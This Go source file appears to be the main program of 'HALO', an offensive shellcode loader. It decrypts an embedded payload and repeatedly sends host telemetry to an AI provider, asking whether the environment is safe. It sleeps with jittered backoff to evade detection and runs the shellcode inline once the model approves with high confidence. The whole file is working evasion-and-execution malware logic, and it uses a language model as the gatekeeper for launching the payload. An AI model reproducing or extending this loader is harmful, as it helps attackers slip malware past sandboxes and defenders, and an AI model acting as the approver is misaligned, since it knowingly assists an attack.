package main

import (
	"fmt"
	"halo/exec"
	"halo/logging"
	"halo/models"
	"halo/telemetry"
	"math/rand"
	"os"
	"strconv"
	"time"
)

func main() {
	// Logging
	logging.InitLog("HALO.log")
	defer logging.CloseLog()

	// Build telemetry
	selfProc, parentProc := telemetry.GetSelfAndParentNames()
	logging.LogLine("[*] HALO (Hybrid Autonomous Logic Operator) started. Self: " + selfProc + ", Parent: " + parentProc)

	// Get shellcode
	shellcodeBytes, err := exec.Decrypt()
	if err != nil || len(shellcodeBytes) == 0 {
		logging.LogLine("[-] Failed to decrypt shellcode or empty.")
		return
	}

	// Provider selection: allow runtime override via AI_PROVIDER, otherwise use build-time default
	providerName := os.Getenv("AI_PROVIDER")
	if providerName == "" {
		providerName = models.DefaultAIProvider
	}

	provider, err := models.GetProvider(providerName)
	if err != nil {
		// Fatal: provider selection failed
		logging.LogLine("[-] AI provider error: " + err.Error())
		os.Exit(1)
	}

	// Build initial baseline with the self/parent info (keeps your original behavior)
	baseline := telemetry.BuildBaseline(selfProc, parentProc)

	// Configurable base interval (seconds), default 30s
	baseInterval := 30 * time.Second
	if v := os.Getenv("TELEMETRY_INTERVAL_SECONDS"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			baseInterval = time.Duration(n) * time.Second
		}
	}

	// Backoff parameters
	maxInterval := 5 * time.Minute
	nextInterval := baseInterval

	// jitter seed
	rand.Seed(time.Now().UnixNano())

	for {
		t := telemetry.Collect(baseline, selfProc, parentProc)
		logging.LogLine("[*] Collected telemetry. Querying model...")

		resp, err := provider.Ask(t)
		if err != nil {
			logging.LogLine("[-] Error querying model: " + err.Error())
			// On error, backoff (same policy as "not safe")
			nextInterval = nextInterval * 2
			if nextInterval > maxInterval {
				nextInterval = maxInterval
			}
			sleepWithJitter(nextInterval)
			continue
		}

		logging.LogLine(fmt.Sprintf("[*] Decision: %v (confidence %.2f)", resp.Allow, resp.Conf))
		logging.LogLine("[*] Reason: " + resp.Reason)
		logging.LogLine("[*] Thoughts: " + resp.Thoughts)

		if resp.Allow && resp.Conf >= 0.8 {
			logging.LogLine("[+] Execution approved. executing shellcode inline.")

			if err := exec.Execute(shellcodeBytes); err != nil {
				logging.LogLine("[-] Shellcode execution failed: " + err.Error())
			} else {
				logging.LogLine("[+] Shellcode execution returned cleanly.")
			}
			// after a successful execution exit main loop
			break
		}

		// Not safe yet: increase backoff up to max and sleep
		nextInterval = nextInterval * 2
		if nextInterval > maxInterval {
			nextInterval = maxInterval
		}
		logging.LogLine("[-] Still not safe. Will try again in " + nextInterval.String())
		sleepWithJitter(nextInterval)

		// Optionally rebuild baseline periodically (here we keep same baseline,
	}
}

// sleepWithJitter sleeps for duration d with ±10% uniform jitter
func sleepWithJitter(d time.Duration) {
	if d <= 0 {
		return
	}
	// jitter up to +/-10%
	jitterRange := int64(d / 10)
	var jitter int64
	if jitterRange > 0 {
		jitter = rand.Int63n(jitterRange*2) - jitterRange
	}
	sleepDur := d + time.Duration(jitter)
	if sleepDur < 0 {
		sleepDur = 0
	}
	time.Sleep(sleepDur)
}
